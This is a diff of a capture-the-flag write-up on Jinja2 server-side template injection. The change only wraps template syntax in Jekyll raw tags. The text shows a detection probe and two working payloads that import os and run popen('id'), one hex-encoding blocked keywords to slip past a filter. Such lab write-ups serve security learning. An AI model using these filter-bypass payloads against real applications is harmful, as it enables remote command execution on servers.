@@ -24,7 +24,7 @@ Using this helpful chart I found on [PortSwigger](https://portswigger.net/web-se
 
 ## Exploitation
 
-This confirms SSTI is possible and the template is Jinja2 because the output of `{{7*'7'}}` is `7777777`. If the output is `49` the template is Twig.
+This confirms SSTI is possible and the template is Jinja2 because the output of {% raw %}`{{7*'7'}}`{% endraw %} is `7777777`. If the output is `49` the template is Twig.
 
 Now I search online and find a [onsecurity](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) writeup about Jinja2 SSTI and try a payload.
 
@@ -45,17 +45,21 @@ The writeup with the payload I used also includes some payloads if `.` `_` `[` a
 
 It uses `attr()` to bypass `.` `[` and `]` and uses the HTML entity `\x5f` instead of `_` .
 
+{% raw %}
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
+{% endraw %}
 
 ![](/assets/imgs/2025-10-17-mctf-template-fury-image-6.png)
 
 Since some terms are still forbidden I try encoding the forbidden terms as HTML entities as well.
 
+{% raw %}
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}
 ```
+{% endraw %}
 
 ![](/assets/imgs/2025-10-17-mctf-template-fury-image-7.png)
 
